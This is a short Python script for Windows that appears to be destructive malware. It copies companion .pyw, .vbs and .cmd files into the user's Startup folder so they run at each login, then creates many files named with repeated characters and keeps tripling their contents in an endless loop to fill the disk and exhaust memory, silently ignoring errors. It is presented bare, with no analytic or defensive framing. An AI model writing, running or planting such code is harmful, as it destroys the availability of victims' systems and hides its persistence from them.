from os import system,path
#for i in range(5):
#    try:
#        f=open('desktop.sof','a')
#        f.write('Stackoverflow\n')
#        f.close()
#    except PermissionError:
#        continue
try:
    system(r'@copy "stackof_extreme.pyw" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
    system(r'@copy "stackof.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
    system(r'@copy "stackof.cmd" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
except:
    pass
names=[]
for ii in range(33,126):
    tmp=chr(ii)
    for jj in range(26):
        names.append(tmp*(jj+1))
try:
    f=open("jas.par")
    systempath=f.read().strip()
except:
    f=open("jas.par",'w')
    systempath=path.abspath('.')
    f.write(systempath)
    f.close()
    system(r'@move "jas.par" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')

for filename in names:
    try:
        nr=''
        try:
            f=open(systempath+'\\'+filename,'a')
        except:
            continue
        f.write('Stackoverflow')
        f.close()
        while True:
            f=open(systempath+'\\'+filename)
            for line in f:
                nr+=line
            f.close()
            f=open(systempath+'\\'+filename,'a')
            for char in nr:
                f.write(char*3)
            f.close()
    except PermissionError:
        continue
    except MemoryError:
        f.close()
        continue
